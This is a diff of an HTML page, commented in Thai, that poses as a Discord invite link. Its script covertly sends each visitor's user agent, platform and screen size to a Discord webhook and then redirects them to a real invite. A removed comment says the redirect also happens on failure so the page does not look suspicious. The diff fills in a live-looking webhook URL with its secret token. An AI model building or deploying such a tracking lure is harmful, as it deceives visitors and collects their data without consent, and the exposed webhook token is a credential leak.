@@ -19,13 +19,13 @@
     </div>
 
     <script>
-        // 1. เอา Webhook URL ที่ก๊อปปี้มาจากขั้นตอนที่ 1 มาใส่ตรงนี้ (ในเครื่องหมายคำพูด)
-        const webhookURL = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN'; 
+        // Webhook ของคุณใส่ไว้ให้แล้ว
+        const webhookURL = 'https://discord.com/api/webhooks/1561646198799073291/WfnNkRIPj7Y9vKheap_1wU11oxwwV_RT1ikuWibzzzDY_ZLo7LTNVb6X9Roni6KVaH6L'; 
         
-        // 2. เอา ลิงก์ดิสคอร์ดจริง ที่จะให้มันเด้งไป มาใส่ตรงนี้
-        const redirectURL = 'https://discord.gg/ลิงก์เชิญดิสของคุณ';
+        // สำคัญมาก: เปลี่ยนลิงก์ด้านล่างนี้เป็นลิงก์เชิญ Discord จริงที่คุณจะให้มันเด้งไป
+        const redirectURL = 'https://discord.gg/ใส่ลิงก์เชิญจริงของคุณตรงนี้';
 
-        // ดึงข้อมูลเบื้องต้นของคนที่กด
+        // ดึงข้อมูลเบื้องต้น
         const data = {
             content: `**มีคนกดลิงก์!**\n**User Agent:** ${navigator.userAgent}\n**Platform:** ${navigator.platform}\n**Screen:** ${window.screen.width}x${window.screen.height}`
         };
@@ -36,10 +36,8 @@
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(data)
         }).then(() => {
-            // เมื่อส่งเสร็จ ให้เด้งไปหน้าดิสจริงทันที
             window.location.href = redirectURL;
         }).catch(() => {
-            // ถ้าส่งไม่สำเร็จ ก็ให้เด้งไปดิสจริงอยู่ดี เพื่อไม่ให้ดูน่าสงสัย
             window.location.href = redirectURL;
         });
     </script>
